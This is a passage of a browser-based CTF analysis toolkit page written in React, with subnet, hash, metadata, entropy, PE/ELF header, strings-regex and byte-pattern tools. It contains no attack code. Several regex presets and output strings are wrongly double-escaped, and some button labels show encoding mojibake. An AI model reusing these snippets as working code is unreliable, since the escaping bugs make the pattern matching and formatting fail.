                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // CIDR / SUBNET CALCULATOR
            if (tool === 'cidr-calculator') {
                const ipToInt = (ip) => ip.split('.').reduce((a, o) => (a<<8) + (Number(o)&255), 0) >>> 0;
                const intToIp = (n) => [n>>>24, (n>>>16)&255, (n>>>8)&255, n&255].join('.');
                const calc = () => {
                    try {
                        const ip = (cidrIp || '').trim();
                        const pfx = Number((cidrPrefix || '').trim());
                        if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) || isNaN(pfx) || pfx<0 || pfx>32) {
                            setOutput('Invalid IP or prefix'); return;
                        }
                        const ipInt = ipToInt(ip);
                        const mask = pfx === 0 ? 0 : (0xFFFFFFFF << (32 - pfx)) >>> 0;
                        const net = (ipInt & mask) >>> 0;
                        const bcast = (net | (~mask)) >>> 0;
                        const hosts = pfx >= 31 ? (pfx === 31 ? 2 : 1) : (bcast - net - 1);
                        const first = pfx >= 31 ? net : net + 1;
                        const last = pfx >= 31 ? bcast : bcast - 1;

                        setOutput([
                            `IP: ${ip}`,
                            `Prefix: /${pfx}`,
                            `Netmask: ${intToIp(mask)}`,
                            `Network: ${intToIp(net)}`,
                            `Broadcast: ${intToIp(bcast)}`,
                            `First host: ${intToIp(first)}`,
                            `Last host: ${intToIp(last)}`,
                            `Usable hosts: ${hosts}`
                        ].join('\n'));
                    } catch (e) {
                        setOutput('Error: ' + (e && e.message ? e.message : String(e)));
                    }
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'CIDR/Subnet Calculator'),
                    e('div', { className: 'grid grid-cols-6 gap-2' },
                        e('input', { type: 'text', value: cidrIp, onChange: (ev) => setCidrIp(ev.target.value), className: 'col-span-4 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'IP (e.g., 10.10.10.10)' }),
                        e('input', { type: 'number', value: cidrPrefix, onChange: (ev) => setCidrPrefix(ev.target.value), min: 0, max: 32, className: 'col-span-2 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: '24' })
                    ),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: calc, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'CALCULATE'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            
            // HASH CALCULATOR
            if (tool === 'hash-calc') {
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hash Calculator'),
                    e(FileDropZone, { label: 'Drop a file here or upload', help: 'Computes MD5/SHA1/SHA256 locally in your browser.', onBytes: (u8) => { setOutput(`Loaded ${u8.length} bytes. Click COMPUTE.`); } }),
                    e('button', { onClick: computeHashes, className: 'w-full px-4 py-3 bg-[#00ff41]/15 border border-[#00ff41]/60 rounded text-xs font-bold hover:bg-[#00ff41]/20' }, 'COMPUTE HASHES'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: () => sendToWorkspace(output, '', { type: 'hashes', fileName }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND â†’ WORKSPACE')
                    )
                );
            }

            // METADATA VIEWER (basic + image dimensions + JPEG EXIF (limited))
            if (tool === 'meta-viewer') {
                const parseBasicMeta = (u8, f) => {
                    let info = [];
                    info.push(`Name: ${f && f.name ? f.name : fileName}`);
                    info.push(`Size: ${u8.length} bytes`);
                    if (f && f.type) info.push(`MIME: ${f.type}`);
                    if (f && f.lastModified) info.push(`Last modified: ${new Date(f.lastModified).toLocaleString()}`);
                    // magic
                    const head = bytesToHex(u8.slice(0,16));
                    info.push(`Head (16B): ${head}`);
                    setOutput(info.join('\\n'));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Metadata Viewer'),
                    e(FileDropZone, { label: 'Drop a file here or upload', help: 'Shows basic info + image dimensions where possible (client-side).', onBytes: (u8, f) => { parseBasicMeta(u8, f); } }),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: () => sendToWorkspace(output, '', { type: 'metadata', fileName }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND â†’ WORKSPACE')
                    )
                );
            }

            // ENTROPY GRAPH
            if (tool === 'entropy-graph') {
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Entropy Graph'),
                    e(FileDropZone, { label: 'Drop a file here or upload', help: 'Plots Shannon entropy per 1KB block (0â€“8). High entropy often indicates compression/encryption.', onBytes: () => { setOutput('Loaded. Click DRAW.'); } }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: () => { drawEntropy('entropyCanvas'); }, className: 'w-full px-4 py-3 bg-[#00d9ff]/15 border border-[#00d9ff]/60 rounded text-xs font-bold' }, 'DRAW'),
                        e('button', { onClick: () => { setOutput(fileBytes ? `Overall entropy: ${calcEntropy(fileBytes).toFixed(4)}` : 'Load a file first.'); }, className: 'w-full px-4 py-3 bg-[#ff00ff]/15 border border-[#ff00ff]/60 rounded text-xs font-bold' }, 'OVERALL ENTROPY')
                    ),
                    e('div', { className: 'p-3 rounded border border-gray-700 bg-black/30' },
                        e('canvas', { id: 'entropyCanvas', width: 900, height: 180, className: 'w-full rounded bg-black/60 border border-gray-800' })
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                    e('button', { onClick: () => sendToWorkspace(output, '', { type: 'entropy', fileName }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND â†’ WORKSPACE')
                );
            }

            // HEADER VIEWER (PE/ELF)
            if (tool === 'header-viewer') {
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'PE/ELF Header Viewer'),
                    e(FileDropZone, { label: 'Drop a binary here or upload', help: 'Quickly identifies ELF/PE and shows key header fields.', onBytes: () => { setOutput('Loaded. Click PARSE.'); } }),
                    e('button', { onClick: parseHeaders, className: 'w-full px-4 py-3 bg-[#00ff41]/15 border border-[#00ff41]/60 rounded text-xs font-bold hover:bg-[#00ff41]/20' }, 'PARSE HEADERS'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                    e('button', { onClick: () => sendToWorkspace(output, '', { type: 'headers', fileName }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND â†’ WORKSPACE')
                );
            }

            // STRINGS + REGEX
            if (tool === 'strings-regex') {
                const runPresets = (preset) => {
                    const text = input || '';
                    const presets = {
                        flags: /[A-Za-z0-9_\\-]{2,}\\{[^\\n\\r]{4,120}\\}/g,
                        jwt: /eyJ[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+/g,
                        urls: /https?:\/\/[^\s"'<>]+/g,
                        emails: /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}/g,
                        hex: /\\b[0-9a-fA-F]{16,}\\b/g
                    };
                    const r = presets[preset] || presets.flags;
                    const matches = text.match(r) || [];
                    setOutput(`Matches (${preset}): ${matches.length}\\n\\n` + matches.join('\\n'));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Strings + Regex'),
                    e(FileDropZone, { label: 'Drop a binary here or upload', help: 'Extracts ASCII strings and lets you run common regex presets (flags/tokens/URLs).', onBytes: (u8) => {
                        const strs = extractStrings(u8, minStringLen).join('\\n');
                        setInput(strs);
                        setOutput(`Extracted strings: ${strs ? strs.split('\\n').length : 0}`);
                    } }),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null,
                            e('div', { className: 'text-xs text-gray-400 mb-2' }, 'INPUT (strings)'),
                            e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                        ),
                        e('div', null,
                            e('div', { className: 'text-xs text-gray-400 mb-2' }, 'OUTPUT (matches)'),
                            e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                        )
                    ),
                    e('div', { className: 'flex flex-wrap gap-2' },
                        e('div', { className: 'flex items-center gap-2' },
                            e('span', { className: 'text-xs text-gray-500' }, 'Min string len'),
                            e('input', { type: 'number', min: 2, max: 32, value: minStringLen, onChange: (ev) => setMinStringLen(parseInt(ev.target.value || '4', 10)), className: 'w-20 px-2 py-1 rounded bg-black/40 border border-gray-700 text-xs font-mono' })
                        ),
                        e('button', { onClick: () => runPresets('flags'), className: 'px-3 py-2 bg-[#00ff41]/10 border border-[#00ff41]/40 rounded text-xs font-bold' }, 'FLAGS'),
                        e('button', { onClick: () => runPresets('jwt'), className: 'px-3 py-2 bg-[#00d9ff]/10 border border-[#00d9ff]/40 rounded text-xs font-bold' }, 'JWT'),
                        e('button', { onClick: () => runPresets('urls'), className: 'px-3 py-2 bg-[#ff00ff]/10 border border-[#ff00ff]/40 rounded text-xs font-bold' }, 'URLS'),
                        e('button', { onClick: () => runPresets('emails'), className: 'px-3 py-2 bg-gray-800/40 border border-gray-700 rounded text-xs font-bold' }, 'EMAILS'),
                        e('button', { onClick: () => runPresets('hex'), className: 'px-3 py-2 bg-gray-800/40 border border-gray-700 rounded text-xs font-bold' }, 'HEX')
                    ),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: () => sendToWorkspace(output, '', { type: 'regex', fileName }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND MATCHES â†’ WORKSPACE'),
                        e('button', { onClick: () => sendToWorkspace(input, '', { type: 'strings', fileName }), className: 'w-full px-3 py-2 bg-gray-800/40 border border-gray-700 rounded text-xs font-bold' }, 'SEND STRINGS â†’ WORKSPACE')
                    )
                );
            }

            // BYTE PATTERN FINDER
            if (tool === 'pattern-finder') {
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Byte Pattern Finder'),
                    e(FileDropZone, { label: 'Drop a file here or upload', help: 'Searches for a hex byte sequence and returns offsets.', onBytes: () => { setOutput('Loaded. Enter a pattern.'); setPatternResults(''); } }),
                    e('input', { value: patternHex, onChange: (ev) => setPatternHex(ev.target.value), placeholder: 'Hex pattern (e.g., 504B0304 for ZIP local header)', className: 'w-full px-3 py-2 rounded bg-black/40 border border-gray-700 text-sm font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: findPattern, className: 'w-full px-4 py-3 bg-[#00ff41]/15 border border-[#00ff41]/60 rounded text-xs font-bold hover:bg-[#00ff41]/20' }, 'FIND'),
                    e('textarea', { value: patternResults, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }),
                    e('button', { onClick: () => sendToWorkspace(patternResults, '', { type: 'pattern', fileName, pattern: patternHex }), className: 'w-full px-3 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'SEND RESULTS â†’ WORKSPACE')
                );
            }

            // WORKSPACE HUB
            if (tool === 'workspace-hub') {
                const exportCase = () => {
                    try {
                        const payload = {
                            createdAt: new Date().toISOString(),
                            workspace: workspaceData,
                            activeTool: tool,
                            note: input,
                            output
                        };
                        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `cypher_case_${Date.now()}.json`;
                        a.click();
                        URL.revokeObjectURL(url);
                    } catch(e) {
                        console.error(e);
                        setOutput('Export failed.');
                    }
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Workspace Hub'),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null,
                            e('div', { className: 'text-xs text-gray-400 mb-2' }, 'WORKSPACE TEXT'),
                            e('textarea', { value: workspaceData.text || '', onChange: (ev)=> setWorkspaceData({ ...workspaceData, text: ev.target.value }), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                        ),
                        e('div', null,
                            e('div', { className: 'text-xs text-gray-400 mb-2' }, 'WORKSPACE HEX'),
                            e('textarea', { value: workspaceData.hex || '', onChange: (ev)=> setWorkspaceData({ ...workspaceData, hex: ev.target.value }), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                        )
                    ),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: () => setWorkspaceData({ text:'', hex:'', meta:{} }), className: 'w-full px-4 py-2 bg-gray-800/40 border border-gray-700 rounded text-xs font-bold' }, 'CLEAR'),
                        e('button', { onClick: () => { setInput(workspaceData.text || ''); setOutput('Loaded workspace text into input.'); }, className: 'w-full px-4 py-2 bg-[#00d9ff]/10 border border-[#00d9ff]/40 rounded text-xs font-bold' }, 'LOAD TEXT â†’ INPUT'),
                        e('button', { onClick: exportCase, className: 'w-full px-4 py-2 bg-[#7c3aed]/15 border border-[#7c3aed]/50 rounded text-xs font-bold' }, 'EXPORT CASE (JSON)')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // NOTES VAULT (lightweight markdown vault)
            if (tool === 'notes-vault') {
                return e(NotesVault, { color, sendToWorkspace });
            }

            return e('div', { className: 'text-center py-12 text-gray-500' }, e(icons.Terminal, { className: 'w-16 h-16 mx-auto mb-4 opacity-50' }), e('p', { className: 'text-lg font-bold' }, 'Tool Ready'), e('p', { className: 'text-sm mt-2' }, 'Select a tool to begin'));
        }
        const mountApp = () => {
            const rootEl = document.getElementById('root');
            if (!rootEl) return;
            // React 18+
            if (ReactDOM.createRoot) {
                ReactDOM.createRoot(rootEl).render(React.createElement(CTFToolkit));
            } else {
                // Legacy fallback
                ReactDOM.render(React.createElement(CTFToolkit), rootEl);
            }
        };

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', mountApp);
        } else {
  try { mountApp(); } catch(e){ (window.__CY_FATAL__||console.error)('ðŸš¨ mountApp exception\\n' + (e && (e.stack||e.message) || e)); }
        }
    </script>
</body>
</html>
